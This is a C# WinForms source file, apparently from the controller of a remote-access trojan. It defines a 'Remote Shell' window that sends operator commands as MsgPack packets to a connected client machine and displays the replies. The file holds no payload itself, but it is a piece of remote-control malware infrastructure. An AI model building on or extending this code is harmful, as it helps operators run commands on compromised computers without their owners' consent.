using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormShell : Form
{
	private IContainer components;

	private TextBox textBox1;

	public RichTextBox richTextBox1;

	private Panel panel1;

	public System.Windows.Forms.Timer timer1;

	public Form1 F { get; set; }

	internal Clients Client { get; set; }

	public FormShell()
	{
		InitializeComponent();
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(textBox1.Text))
		{
			if (textBox1.Text == "cls".ToLower())
			{
				richTextBox1.Clear();
				textBox1.Clear();
			}
			if (textBox1.Text == "exit".ToLower())
			{
				Close();
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = textBox1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			textBox1.Clear();
		}
	}

	private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
		msgPack.ForcePathObject("WriteInput").AsString = "exit";
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormShell));
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.textBox1 = new System.Windows.Forms.TextBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		base.SuspendLayout();
		this.richTextBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(40, 42, 54);
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.richTextBox1.ForeColor = System.Drawing.Color.FromArgb(248, 248, 242);
		this.richTextBox1.Location = new System.Drawing.Point(0, 0);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(800, 412);
		this.richTextBox1.TabIndex = 0;
		this.richTextBox1.Text = "";
		this.textBox1.BackColor = System.Drawing.Color.FromArgb(248, 248, 242);
		this.textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.textBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.textBox1.ForeColor = System.Drawing.Color.FromArgb(40, 42, 54);
		this.textBox1.Location = new System.Drawing.Point(46, 423);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(754, 26);
		this.textBox1.TabIndex = 1;
		this.textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.panel1.BackColor = System.Drawing.Color.FromArgb(40, 42, 54);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Left;
		this.panel1.Location = new System.Drawing.Point(0, 0);
		this.panel1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(46, 449);
		this.panel1.TabIndex = 2;
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(40, 42, 54);
		base.ClientSize = new System.Drawing.Size(800, 449);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.textBox1);
		base.Controls.Add(this.panel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormShell";
		this.Text = "Remote Shell";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormShell_FormClosed);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
